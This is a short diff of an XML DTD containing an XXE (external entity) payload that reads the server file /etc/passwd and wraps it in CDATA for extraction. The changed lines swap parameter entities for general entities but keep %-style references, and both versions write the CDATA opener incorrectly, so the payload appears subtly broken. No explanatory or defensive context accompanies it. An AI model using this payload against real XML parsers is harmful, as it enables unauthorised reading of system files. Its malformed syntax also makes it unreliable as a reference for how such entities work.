@@ -1,5 +1,5 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % start "<!CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % wrapper "<!ENTITY all %start;%file;%end;">
+<!ENTITY file SYSTEM "/etc/passwd">
+<!ENTITY start "<!CDATA[">
+<!ENTITY end "]]>">
+<!ENTITY wrapper "<!ENTITY % all %start;%file;%end;">
 %wrapper;
